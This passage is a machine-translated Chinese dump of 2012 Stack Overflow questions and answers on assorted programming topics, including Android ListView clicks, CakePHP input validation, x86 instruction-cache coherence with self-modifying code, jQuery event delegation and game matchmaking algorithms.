        public void onItemClick(AdapterView<?> arg0, View arg1, int arg2,
                long arg3) {
            //Toast.makeText(getBaseContext(), ""+arg2,     Toast.LENGTH_SHORT).show();
            Log.d("DEBUG", ""+arg2);

        }

    });

    ll.addView(lv);
    setContentView(ll);

}

} 
```

基本上，我首先创建一个 LinearLayout 对象，然后将 ListView 对象作为其子对象之一。我观察到如此创建的列表项不可点击。但如果我写

```
setContentView(lv); 
```

代替

```
setContentView(ll); 
```

列表项是可点击的。谁能解释一下？如果我必须以后一种方式实现我的类，如何使列表项可点击？我不想采用 ListActivity 的方式。

list_item.xml

```
<?xml version="1.0" encoding="utf-8"?>
<TextView xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:padding="10dp"
    android:textSize="16sp" >
</TextView> 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-12T07:52:38.540

更改您的代码：

```
ll.addView(lv); 
```

对此：

```
ll.addView(lv, LayoutParams.FILL_PARENT, LayoutParams.FILL_PARENT); 
```

问题解决了，我想，你必须给列表视图某种布局限制或定义，这样它才能正常工作。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-12T05:27:28.343

我能够让它工作，但我必须在 XML 中创建 LinearLayout，我意识到这与你拥有它的方式不同。但是，考虑到无论哪种方式，LinearLayout 都是根元素，并且您仍在以编程方式创建 ListView，恕我直言，它确实应该没有区别。

```
public class ExampleActivity extends Activity implements OnItemClickListener {

private LinearLayout ll;

@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.your_layout);
    ll = (LinearLayout) findViewById(R.id.main_ll);
    ListView lv = new ListView(this);
    ll.addView(lv);

    String[] values = new String[10];
    for (int i = 0; i < 10; i++) {
        values[i] = "" + i;
    }

    ArrayAdapter<String> adapter = new ArrayAdapter<String>(this,
            android.R.layout.simple_list_item_1, values);
    lv.setAdapter(adapter);
    lv.setOnItemClickListener(this);
}

@Override
public void onItemClick(AdapterView<?> arg0, View arg1, int arg2, long arg3) {
    Toast.makeText(this, "" + arg2, Toast.LENGTH_SHORT).show();
    Log.d("DEBUG", "" + arg2);
} 
```

}

# php - cakePHP - 防止表单选择列表篡改

> ID：10989392
> 
> 赞同：2
> 
> 时间：2012-06-12T01:08:31.360
> 
> 标签：php, forms, security, cakephp, cakephp-2.0

我有一个带有几个选择输入的简单表单。其中之一是性别选择。

输入是这样生成的：

```
echo $this->Form->input('gender_id', array(
    'options' => array(
        1 => 'Male',
        2 => 'Female'
    )
)); 
```

如何确保只能提交给定的选择，从而无法提交 3 或其他内容？

我正在使用安全组件，它似乎可以防止字段名称被篡改，但不能防止值被篡改。

对于像州选择这样的较大选择列表，进行简单的比较是不切实际的。此外，我试图避免进行额外的查询来验证 id。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-04T22:41:49.007

要求值位于模型验证的指定列表中：

```
public $validate = array(
    'gender_id' => array(
      'allowed' => array(
      'rule'    => array('inList', array(1, 2)),
      'message' => 'Please select male or female.'
     )
   )
 ); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T01:12:48.393

使 DB 中的该字段成为允许值为 1 和 2的[ENUM字段。](http://en.wikipedia.org/wiki/Enumerated_type)

您**无法**阻止有人提交第三个值，只需使用 FireBug 操作 DOM 或 POST 请求。如果它不是数据库值并且没有通过模型表单验证规则运行，则必须在控制器中手动执行。因为根据您的描述，只有这种验证是必要的。

# php - Github 合并问题（显示所有行）

> ID：10989395
> 
> 赞同：1
> 
> 时间：2012-06-12T01:08:54.153
> 
> 标签：php, git, github, git-merge, merge-conflict-resolution

我正在尝试合并我的两个分支，在尝试解决冲突时，我通常可以打开文件并添加了 github

```
">>>>HEAD
 {my code}
 ========
 {other code}
 >>>>Other" 
```

这向我展示了两个版本中哪些特定的代码行不同，然后我可以决定保留哪些行。但是，当我合并一些 PHP 文件时，并没有显示出确切的差异。相反，PHP 文件的顶部是我的版本，包含所有行，底部是另一个版本。尝试以这种方式解决冲突要困难得多。关于为什么会发生这种情况有什么建议吗？如何以更简单的方式解决我的冲突？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T01:16:28.727

我倾向于通过编辑文件来手动修复合并。希望您不必经常这样做。但是，有一个我见过人们使用的合并工具。

[http://www.kernel.org/pub/software/scm/git/docs/git-mergetool.html](http://www.kernel.org/pub/software/scm/git/docs/git-mergetool.html)

有帮助的锄头

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T07:55:28.800

[这是Rich](https://stackoverflow.com/users/328936/rich)在[他的回答](https://stackoverflow.com/a/8883329/6309)中提到的副作用。

> 我在此设置中注意到的一个小问题是，当存在合并冲突时，**git 添加的用于标记差异的行没有 Windows 行尾，即使文件的其余部分有**，你也可以结束带有混合行结尾的文件

这是要避免的另一个参数`core.autocrlf true`，并将其设置为 false。

# php - html图像滑块在php中不起作用

> ID：10989397
> 
> 赞同：0
> 
> 时间：2012-06-12T01:09:26.523
> 
> 标签：php, slideshow

我最近将所有 html 页面更改为 .php 页面，用于新的包含页眉和页脚以及导航。这是我第一次尝试使用 php 语言，我很难理解它如何影响我之前页面上已有的 html 代码。

我遇到的一个问题是我现在不再滑动的简单图片幻灯片。它只是停在第一张图片上，而不是旋转 4 张图片。

我是否必须添加新的 php 语言才能使其再次工作？有谁知道下面的 php 编码阻止了它的工作？

**php头代码如下：**

```
 <?php
require_once("calendar/includes/config.php");

$db_connection = mysql_connect ($DBHost, $DBUser, $DBPass) OR die (mysql_error());  
$db_select = mysql_select_db ($DBName) or die (mysql_error());
$db_table = $TBL_PR . "events";

$query = "SELECT * FROM calendar_category WHERE status=1";

$query_result = mysql_query($query);

while($query_fetch = mysql_fetch_array($query_result)){
    if(empty($andcat)) $andcat = " (`category` = $query_fetch[0] OR `category` LIKE '$query_fetch[0],%' OR `category` LIKE '%,$query_fetch[0],%' OR `category` LIKE '%,$query_fetch[0]')";
    else $andcat .= " OR (`category` = $query_fetch[0] OR `category` LIKE '$query_fetch[0],%' OR `category` LIKE '%,$query_fetch[0],%' OR `category` LIKE '%,$query_fetch[0]')";
}

$query2 = "SELECT * FROM $db_table where STR_TO_DATE(concat(event_day,',',event_month,',',event_year),'%d,%m,%Y') >= curdate() AND (".$andcat." )
order by STR_TO_DATE(concat(event_day,',',event_month,',',event_year),'%d,%m,%Y') LIMIT 3";

$query_result2 = mysql_query($query2);

?>

<!DOCTYPE html>

<html lang="en">

<head>

    <title>Creative Minds International PCS</title>

    <meta charset="utf-8">

    <meta name="description" content="Your description">

    <meta name="keywords" content="Your keywords">

    <meta name="author" content="Your name">

    <link rel="stylesheet" href="css/style.css">

    <link href='http://fonts.googleapis.com/css?family=Vollkorn' rel='stylesheet' type='text/css'>

    <script src="site/js/jquery-1.6.4.min.js"></script>

    <script src="site/js/script.js"></script>

    <script src="site/js/flashobject.js"></script>

    <!--[if lt IE 7]>

        <div class='aligncenter'><a href="http://www.microsoft.com/windows/internet-explorer/default.aspx?ocid=ie6_countdown_bannercode"><img src="http://storage.ie6countdown.com/assets/100/images/banners/warning_bar_0000_us.jpg"border="0"></a></div>  

    <![endif]-->

    <!--[if lt IE 9]>

        <script src="js/html5.js"></script>

        <link rel="stylesheet" href="css/ie.css"> 

    <![endif]-->

    <script type="text/javascript">

<!--

var image1=new Image()

image1.src="../slideshow3.jpg" 

var image2=new Image()

image2.src="../slideshow2.jpg"

var image3=new Image()

image3.src="../slideshow4.jpg"

var image4=new Image()

image4.src="../slideshow1.jpg"

//-->

</script>

<script type="text/javascript">

  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-28106351-1']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();

</script>
    </head>

<body id="page2">

<div class="main-bg">

<header><?php include('includes/header.php'); ?>   

    <div class="nav-container" >
<navigation><?php include('includes/nav.php'); ?>      

            <div class="clear"></div>

            </div>

                 <div class="flash" >

                    <div id="head">

                    <div class="aligncenter"><img src="slideshow3.jpg"  alt="Creative Minds Slideshow" width="990" height="450" id="Slideshow">   <script>

        <!--

        //variable that will increment through the images

        var step=1

        function slideit(){

        //if browser does not support the image object, exit.

        if (!document.images)

        return

        document.images.slide.src=eval("image"+step+".src")

        if (step<4)

        step++

        else

        step=1

        //call function "slideit()" every 2.5 seconds

        setTimeout("slideit()",6000)

        }

        slideit()

        //-->

        </script>             

        </div></div>

    </div>  

</header> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T01:16:52.297

做两件事：

1.  检查您的 Apache 错误日志以查找隐藏的错误
2.  删除文档类型前的空格：更改

    ?>

    < !DOCTYPE html>

至

```
?><!DOCTYPE html> 
```

# java - Apache camel 同时读取两个 .csv 文件

> ID：10989399
> 
> 赞同：0
> 
> 时间：2012-06-12T01:09:36.333
> 
> 标签：java, apache-camel

通过更改两个域模型的包解决了我在之前的链接 [Apache camel 同时处理两个 csv 文件](https://stackoverflow.com/questions/10943445/apache-camel-processing-two-csv-files-simultaneously)中发布的上述错误。

但是，它给出了另一个错误并回滚了两个 .csv 文件的处理。这两个 .csv 文件都有两个单独的处理器来处理交换。

> 错误：[#|2012-06-12T10:23:54.651+1000|SEVERE|glassfish3.0.1|org.apache.camel.processor.DefaultErrorHandler|_ThreadID=35;_ThreadName=Thread-1;|(MessageId: ExchangeId 上的 ID-GEPC7848-52123-1339460612530-0-651：ID-GEPC7848-52123-1339460612530-0-658）。交付尝试后用尽：1 捕获：java.lang.NullPointerException

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T20:47:48.390

Nullpointer Exception 始终是 bug 的良好候选者。您可以尝试使用调试日志记录并检查是否获得完整的堆栈跟踪吗？如果您可以使用堆栈跟踪和描述如何在骆驼 jira 中重现为此创建一个 jira 问题，那就太好了。

# iphone - 向 URL Objective-C 发送多个 POST 请求

> ID：10989401
> 
> 赞同：0
> 
> 时间：2012-06-12T01:10:18.810
> 
> 标签：iphone, post

我正在尝试制作一个将数据发布到 URL [http://api.sourcelair.com/exec/create](http://api.sourcelair.com/exec/create)的应用程序，它需要将数据与 post 一起发送。
这是需要发送到 URL 的数据

```
 code      : "The source code that you want to execute" ,
    language  : "The programming language of your code (e.g. C)"
    input     : "The optional standard input of your program" 
```

我可以将数据发送到 URL 的代码是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T02:34:18.257

如果您使用的是库，例如`ASIHTTPRequest`它将很简单：

```
ASIFormDataRequest *request = [ASIFormDataRequest requestWithURL:url];
[request setPostValue:@"The source code that you want to execute" forKey:@"code"];
[request setPostValue:@"The programming language of your code (e.g. C)" forKey:@"language"];
[request setPostValue:@"The optional standard input of your program" forKey:@"input"];
[request startAsynchronous]; 
```

当然，您需要设置委托和响应方法。`ASIHTTPRequest`您可以在这里找到更多信息， [http://allseeing-i.com/ASIHTTPRequest/How-to-use](http://allseeing-i.com/ASIHTTPRequest/How-to-use)

或者，您可以使用`NSURLConnection`类来提出`POST`请求。更多信息在这里：[https ://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/nsurlconnection_Class/Reference/Reference.html](https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/nsurlconnection_Class/Reference/Reference.html)

# c - x86 指令缓存如何同步？

> ID：10989403
> 
> 赞同：24
> 
> 时间：2012-06-12T01:10:37.010
> 
> 标签：c, assembly, instructions, cpu-cache, self-modifying

我喜欢例子，所以我用c写了一些自修改代码......

```
#include <stdio.h>
#include <sys/mman.h> // linux

int main(void) {
    unsigned char *c = mmap(NULL, 7, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|
                            MAP_ANONYMOUS, -1, 0); // get executable memory
    c[0] = 0b11000111; // mov (x86_64), immediate mode, full-sized (32 bits)
    c[1] = 0b11000000; // to register rax (000) which holds the return value
                       // according to linux x86_64 calling convention 
    c[6] = 0b11000011; // return
    for (c[2] = 0; c[2] < 30; c[2]++) { // incr immediate data after every run
        // rest of immediate data (c[3:6]) are already set to 0 by MAP_ANONYMOUS
        printf("%d ", ((int (*)(void)) c)()); // cast c to func ptr, call ptr
    }
    putchar('\n');
    return 0;
} 
```

...显然有效：

```
>>> gcc -Wall -Wextra -std=c11 -D_GNU_SOURCE -o test test.c; ./test
0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 
```

但老实说，我根本没*想到*它会起作用。我希望包含的指令`c[2] = 0`在第一次调用时被缓存`c`，之后所有连续调用`c`都会忽略对的重复更改`c`（除非我以某种方式明确地使缓存无效）。幸运的是，我的 cpu 似乎比这更聪明。

`c`我猜每当指令指针进行较大的跳转（如上面对 mmapped 内存的调用）时，cpu 都会将 RAM（假设甚至驻留在 RAM 中）与指令缓存进行比较，并在缓存不匹配时使缓存无效（全部？），但我希望能得到更准确的信息。特别是，我想知道这种行为是否可以被认为是可预测的（除非硬件和操作系统有任何差异），并且可以依赖？

（我可能应该参考英特尔手册，但那东西长达数千页，我往往会迷失其中......）

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2012-06-12T10:25:01.057

您所做的通常称为**自修改代码**。正如手册指出的那样，英特尔的平台（可能还有 AMD 的）为您完成了维护*i/d 缓存一致性的工作（*[手册 3A，系统编程](http://download.intel.com/products/processor/manual/253668.pdf)）

> 11.6 自修改代码
> 
> 对当前缓存在处理器中的代码段中的内存位置的写入会导致相关的缓存行（或多个行）无效。

但是只要使用相同的线性地址进行修改和获取，这个断言就有效，*调试器*和*二进制加载*器就不是这样，因为它们不在同一个地址空间中运行：

> 包含自修改代码的应用程序使用相同的线性地址来修改和获取指令。系统软件（例如调试器）可能会使用与用于获取指令的线性地址不同的线性地址来修改指令，将在执行修改的指令之前执行序列化操作（例如 CPUID 指令），这将自动重新同步指令缓存和预取队列。

例如，许多其他架构（如 PowerPC）总是要求序列化操作，必须明确地完成（[E500 核心手册](http://cache.freescale.com/files/32bit/doc/ref_manual/E500CORERM.pdf)）：

> 3.3.1.2.1 自修改代码
> 
> 当处理器修改任何可以包含指令的内存位置时，软件必须确保指令高速缓存与数据内存一致，并且修改对指令获取机制可见。即使缓存被禁用或页面被标记为缓存禁止，也必须这样做。

有趣的是，即使缓存被禁用，PowerPC 也需要发出上下文同步指令。我怀疑它会强制刷新更深层次的数据处理单元，例如加载/存储缓冲区。

*您提出的代码在没有窥探*或高级*缓存一致性*设施的架构上是不可靠的，因此可能会失败。

希望这有帮助。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-06-12T01:15:53.723

这很简单；写入指令高速缓存中的一个高速缓存行中的地址会使指令高速缓存中的地址无效。不涉及“同步”。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-06-12T01:15:57.433

CPU 会自动处理缓存失效，您无需手动执行任何操作。软件无法合理地预测任何时间点 CPU 缓存中会或不会出现什么，因此由硬件来处理这个问题。当 CPU 看到您修改了数据时，它会相应地更新其各种缓存。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2013-08-22T18:49:56.680

顺便说一句，许多 x86 处理器（我研究过的）不仅窥探指令缓存，还窥探管道、指令窗口——当前正在运行的指令。因此，自修改代码将在下一条指令生效。但是，我们鼓励您使用像 CPUID 这样的序列化指令来确保执行您新编写的代码。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2013-06-19T22:08:28.793

我刚刚在我的一次搜索中找到了这个页面，并想分享我在 Linux 内核这一领域的知识！

您的代码按预期执行，这里对我来说没有任何意外。mmap() 系统调用和处理器缓存一致性协议为您完成了这个技巧。标志“PROT_READ|PROT_WRITE|PROT_EXEC”要求 mmamp() 正确设置此物理页的 iTLB、L1 缓存的 dTLB 和 L2 缓存的 TLB。这种低级架构特定的内核代码会根据处理器架构（x86、AMD、ARM、SPARC 等）以不同的方式执行此操作。这里的任何内核错误都会弄乱您的程序！

这只是为了解释的目的。假设您的系统没有做太多事情，并且在“a[0]=0b01000000;”之间没有进程切换 并开始 "printf("\n"):"... 另外，假设您的处理器中有 1K 的 L1 iCache、1K dCache 和核心中有一些 L2 缓存，. （现在这些都是几 MB 的顺序）

1.  mmap() 设置您的虚拟地址空间和 iTLB1、dTLB1 和 TLB2。
2.  “a[0]=0b01000000；” 实际上会将（硬件魔术）捕获到内核代码中，并且将设置您的物理地址，并且内核将加载所有处理器 TLB。然后，您将回到用户模式，您的处理器实际上会将 16 个字节（H/W magic a[0] 到 a[3]）加载到 L1 dCache 和 L2 Cache。只有当您引用 a[4] 等等时，处理器才会真正再次进入内存（暂时忽略预测加载！）。当您完成“a[7]=0b11000011;”时，您的处理器已经在永恒总线上完成了 2 次突发 READ，每次 16 字节。仍然没有实际写入物理内存。所有 WRITE 都发生在 L1 dCache（硬件魔法，处理器知道）和 L2 缓存中，因此为缓存线设置了 DIRTY 位。
3.  “一个[3]++；” 汇编代码中会有 STORE 指令，但处理器只会将其存储在 L1 dCache&L2 中，并且不会进入物理内存。
4.  让我们来看看函数调用“a()”。处理器再次执行从 L2 Cache 到 L1 iCache 的指令提取，依此类推。
5.  由于低级 mmap() 系统调用和缓存一致性协议的正确实现，此用户模式程序的结果在任何处理器下的任何 Linux 上都是相同的！
6.  如果您在没有操作系统帮助的情况下在任何嵌入式处理器环境下编写此代码 mmap() 系统调用，您会发现您所期望的问题。这是因为您没有使用硬件机制（TLB）或软件机制（内存屏障指令）。

# json - 如何隐藏从服务器发回的 JSON 数据

> ID：10989407
> 
> 赞同：1
> 
> 时间：2012-06-12T01:11:01.923
> 
> 标签：json, browser, hide, httprequest

我有一个从服务器接收 JSON 数据的应用程序。目前，当我查看 firebug 时，我可以看到正在传输的所有数据。

由于任何人都可能查看和窃取这些数据，我需要采取哪些步骤才能使我的数据只能从我的应用程序中查看，而不能以其他方式查看。

我可以用谷歌搜索哪些关键字来了解这是如何完成的以及我需要使用哪些技术。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T01:18:15.030

我认为你错过了重点。您已将数据发送到 Web 客户端，在这种情况下发生在 Firefox 上。一旦您发送了数据，您就无法控制它。

然后 Firefox 可以对数据做任何它想做的事情，包括在屏幕上呈现它（这是你想要的）并将它呈现给任何调试侦听器（这是你不想要的）。

即使有某种方法可以阻止 Firefox 在 firebug 中显示数据，任何人都可以轻松编写自己的网络客户端，伪装成网络浏览器，然后他们可以对数据做任何他们想做的事情。

您不能同时拥有这两种方式 - 在屏幕上向他们显示数据，但同时隐藏您发送到他们浏览器的原始 json。

如果应用程序正在发送用户不应该看到的 json 数据、某种安全数据，并且该信息未在用户的浏览器中显示给用户，则不要在 json 中发送该数据。如果他们被允许在他们的浏览器中查看它，那么您必须将它发送到他们的浏览器，他们可以以任何他们想要的方式阅读它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-09-17T16:43:52.103

我一直使用的一种方法是加密数据，特别是如果它是密码，您可以使用河豚加密，这不是最安全的加密方法。sin bcrypt()，带有强盐。在此处查看更多信息 php.net/manual/en/function.crypt.php

# jquery - jQuery .on() 选择器

> ID：10989414
> 
> 赞同：1
> 
> 时间：2012-06-12T01:12:08.683
> 
> 标签：jquery

我正在使用 jQuery 的 on() 函数将事件绑定到容器 div 并提供“.myItem”选择器。

```
$container.on('click', '.myItem', { me: this }, MyClass.prototype.onItemClick); 
```

除了没有“myItem”类的子元素仍然导致事件触发之外，一切都运行良好。这是正确的行为吗？选择器将匹配具有“myItem”类及其子级的元素？

```
<div class="myItem">
   <div>My Label</div>
</div> 
```

根据我的实验，`<div>`上述两个 s 都会触发该事件。我想要的是单击子 div 以冒泡到具有类名的父 div，然后为该元素触发事件。即在事件处理程序内部，`event.target`应始终引用`.myItem`元素。

这可能吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T01:29:27.507

> 我想单击“我的标签”div 来触发事件，但会冒泡，以便 event.target 是“myItem”div。

在这种情况下，`myItem`不会`event.target`。会的`event.currentTarget`。有关更多详细信息，请参阅[我提交](http://bugs.jquery.com/ticket/11756)的有关该问题的问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T01:19:41.207

为了通过单击获得该功能，您需要停止在子节点上传播 click 方法，以防止它们冒泡到它们的父节点。

```
$('.myItem *').on('click', function(evt) {
    event.stopPropagation();
}); 
```

**现场示例**- [http://jsfiddle.net/tj_vantoll/J8jEe/](http://jsfiddle.net/tj_vantoll/J8jEe/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-12T01:20:15.823

单击子对象也是单击父对象，因此单击子对象将触发父对象的单击处理程序，除非您处理子对象中的单击并停止传播事件。

但是，当像您一样使用委托事件处理时，停止事件传播是有限制的。在事件已经传播到您附加委托事件处理程序的容器之前，您的事件处理程序甚至不会触发。因此，此时停止通过容器下方的元素进行传播为时已晚（因为传播已经发生）。您可以在容器之外停止传播。

如果您只想在标签中单击，您可以执行以下操作：

```
$container.on('click', '.myItem label', function() {
    // your code here
}); 
```

这将使用委托事件处理并将点击隔离到标签中的那些点击。

如果您想要该`.myItem`单击处理程序中的父对象，则可以像这样获取它：

```
$container.on('click', '.myItem label', function() {
    var item = $(this).closest('.myItem');
}); 
```

# emacs - xresources 中的 Emacs 模式行框

> ID：10989415
> 
> 赞同：1
> 
> 时间：2012-06-12T01:12:09.347
> 
> 标签：emacs

我在 ubuntu 12.04 中使用 emacs。我想在我的 .Xresources 中定义一些背景或前景。

当我使用：

```
Emacs.mode-line.attributeForeground: #ccc
Emacs.mode-line.attributeBackground: #333 
```

它有效，现在我想禁用模式行框或将模式行框颜色设置为#ccc。

我用谷歌搜索并找到了一些：

```
Emacs.mode-line.AttributeBox: off 
```

但它没有用。我只希望它在 .Xresource 文件中而不是 emacs 初始化文件中。谁能帮我？谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T01:48:21.197

由于 emacs X 窗口实例默认具有小写名称，因此您似乎也必须使用小写指定主要资源类，即：

```
emacs.mode-line.attributeBox: nil 
```

此外，您需要使用`nil`禁用 box 属性，因为 emacs 会为`off`. 同样，如果您希望在将鼠标悬停在模式行中的项目上时禁用 box 属性，您可能还需要设置`emacs.mode-line-highlight.attributeBox`为。`nil`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-12T03:09:24.203

我在 ubuntu12.04 中使用 emacs24。

模式行中的此禁用框属性（感谢 Greg E.）：

```
Emacs.mode-line.attributeBox: nil 
```

此设置模式行框颜色：

```
Emacs.mode-line.attributeBox: "#333" 
```

而这个设置模式行背景和前景：

```
Emacs.mode-line.attributeForeground: #ccc
Emacs.mode-line.attributeBackground: #333 
```

在我的电脑中，设置背景或前景不能使用双引号，设置框颜色必须使用双引号。我不知道为什么。

# delphi - 不同大小的图像加载到 TImageList

> ID：10989416
> 
> 赞同：0
> 
> 时间：2012-06-12T01:12:12.317
> 
> 标签：delphi

我加载的图像大小略有不同。我怎样才能得到最小的尺寸并将它们全部重新调整到那个尺寸？

下面的代码是图像的加载->转换为bmp->添加到imagelist

大约 3 张图像后，它给出了错误无效的图像大小。由于图像大小对于我在开始时给出的图像列表的大小来说太大了。

```
procedure TForm1.LoadImages(const Dir: string);
var
  z,i: Integer;
  CurFileName: string;
  JpgIn: TJPEGImage;
  BmpOut: TBitmap;
begin
  i := 0;
  z := 1;
  while True do
  begin
    CurFileName := Format('%s%d.jpg',
                          [IncludeTrailingPathDelimiter(Dir), i]);
    if not FileExists(CurFileName) then
      Break;
    JpgIn := TJPEGImage.Create;
    try
      JpgIn.LoadFromFile(CurFileName);
      if z = 1 then
       begin
        ImageList1.SetSize(jpgin.width, jpgin.Height);
        z := 0;
       end;
      BmpOut := TBitmap.Create;
      try
         BmpOut.Assign(JpgIn);
         ImageList1.Add(BmpOut, nil);
      finally
        BmpOut.Free;
      end;
    finally
      JpgIn.Free;
    end;
    Inc(i);
  end;
  if ImageList1.Count > 0 then
  begin
    BmpOut := TBitmap.Create;
    try
      ImageList1.GetBitmap(1, BmpOut);
      zimage1.Bitmap.Assign(bmpout);
      zimage1.Repaint;
    finally
      BmpOut.Free;
    end;
  end;
end; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T01:45:11.710

一旦开始将图像放入 中`TImageList`，就无法调整它的大小，并且所有图像的大小必须相同。因此，您必须提前预加载所有图像，以便确定可用的最小尺寸，然后将任何较大的图像裁剪/拉伸到较小的尺寸，然后您可以将最终图像加载到`TImageList`.

让您的循环将所有内容存储`TJPEGImage`到 a`TList`或`TObjectList`不立即释放它们，然后您可以循环遍历该列表以计算最小尺寸，然后根据需要再次循环遍历列表调整图像大小，然后再次循环遍历列表添加图像到`TImageList`, 然后最后循环释放图像的列表。

# ember.js - 更新 ArrayController 中的元素

> ID：10989419
> 
> 赞同：0
> 
> 时间：2012-06-12T01:12:29.277
> 
> 标签：ember.js

更新 ArrayController 的 content 属性中的元素的最佳方法是什么，以便更新任何关联的视图。

目前，我使用以下代码，它更新内容但不更新视图

```
 updateContent: function(device) {
        for (var index = 0; index < this.content.length; index++) {
            if (this.content[index]._id === device._id) {
                this.content.splice(index, 1, device);
                break;
            }
        }
    } 
```

这样做的最佳方法是什么？

在这种特殊情况下，我使用 soket.io 接收来自服务器的调用，因为设备状态会在相应地更新视图时发生变化。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-11T13:26:45.840

您搜索的方法名称是[replace](http://emberjs.com/api/classes/Ember.ArrayProxy.html#method_replace)（在 MutableArray 中找到，ArrayProxy 继承自该方法）。
请注意，API 的不同之处在于您传递要插入的元素数组，例如

this.content.splice(index, 1, **[** device **]** );

正如@ebryn 所说，数组的拼接没有被覆盖，原始方法确实更改了数组的内容，但不通知观察者，其中视图（由把手处理的 DOM 更改）可能是其中之一。

我已经在 0.96 版中检查了这一点。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-12T02:28:46.743

您没有在内容数组上使用可观察的数组方法，这就是视图没有被更新的原因。

有关可观察数组方法的列表，请参阅 Ember.Array/Ember.Enumerable 文档：

[http://docs.emberjs.com/#doc=Ember.Array&src=false](http://docs.emberjs.com/#doc=Ember.Array&src=false)

[http://docs.emberjs.com/#doc=Ember.Enumerable&src=false](http://docs.emberjs.com/#doc=Ember.Enumerable&src=false)

# c++ - 游戏的匹配算法

> ID：10989421
> 
> 赞同：2
> 
> 时间：2012-06-12T01:12:37.497
> 
> 标签：c++, algorithm

（这是针对我正在设计的游戏）假设一个游戏中有两队玩家。每支球队将有4名球员。每个玩家都有一个等级（0-9），其中 0 表示一个糟糕的玩家，9 表示一个了不起的玩家。有一个等待玩游戏的玩家队列（或列表）（这可能是一个小数字或一个非常大的数字）。假设每支球队的总排名是其中 4 名球员的平均排名。有多个开放的比赛和球队可以放置一名球员。

问题：有什么好的算法可以将玩家置于团队的等待队列/列表中，以便游戏中的每个团队在游戏中具有或多或少相同的总体排名（不一定是完美的）？此外，球员不应该等待超过一分钟才能被安排在一个团队中（如果球员很少，可以更多）[他们被安排得越快越好]

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-06-12T01:45:14.003

这完全取决于球队的综合排名需要有多接近。如果准确性不是那么重要，您可以执行以下简单操作：

1.  将前八名球员从名单中删除。
2.  将排名最高的球员放在 A 队，将第二高的球员放在 B 队
3.  剩下六名球员，这意味着你还剩下 20 个球队组合。计算所有 20 并选择导致最接近团队分数的组合。

这应该是快速和简单的，尽管它可能不会产生最平衡的结果。等待时间应该最短，因为它总是使用等待时间最长的玩家。第 2 步确实是消除计算可能性数量的捷径。如果没有第 2 步，则有 70 种可能的团队组合（“8 选 4”）。您可能会发现您可以计算所有 70 个并找到一个好的解决方案，而不会占用太多时间。提示：理想的球队得分是（所有球员的总和/2）。如果您偶然发现与该特定团队得分的组合，您可以停下来。

如果您愿意，可以进一步细化此步骤。一旦你找到了八人中最好的对决，比较两支球队的得分。如果他们相距太远（你必须定义什么构成“太远”），用队列中的下两个玩家随机替换两个玩家，然后再试一次。你甚至可以根据玩家等待的时间来让“太远”的定义变得更宽松。

您也可以对此采取稍微不同的方法。将球员随机分组，然后寻找两个排名相似的球队（这变得像比较一个数字一样简单）。一旦一支球队在指定的时间内没有找到比赛，将这些球员放回池中以重新组成新球队。如果您通常有大量玩家排队（因此有更多的现成团队），那么这可能会更快地产生结果。

在你花太多时间在这个算法上之前，先好好看看生成玩家排名的算法。人的技能和经验不能用一个数字来概括而没有相对较大的误差范围。如果这里的误差可能相当大，那么您可以使用不太准确的团队建设算法（任何额外的准确性都会被玩家排名系统中的错误抵消）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-12T01:24:05.247

你应该开始用一个人来搭建桌子。如果 A 的等级为 8，而另一个玩家以 4 的等级加入游戏，而你的位置指南是 2，那么

玩家 A 有桌子 玩家 A 的等级为 8

玩家 B 进入房间 玩家 B 的排名不是在 6 到 10 之间吗？

```
if (Brank < Arank - 2 || Brank > Arank + 2) 
```

如果这是真的，那么排名不在表格的限制范围内，您应该以 Brank 作为您比较的排名开始一个新表格。

如果这是错误的，那么排名是表声明排名的 +-2 并且该玩家可以加入。

如果你真的想看中，你可以根据等桌的人数来宣布排名。

如果大厅100人，则限制+- 2。如果大厅15人，则限制+- 4。（使游戏更加不平衡，但不会导致人们等待太久）。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-06-12T01:35:34.583

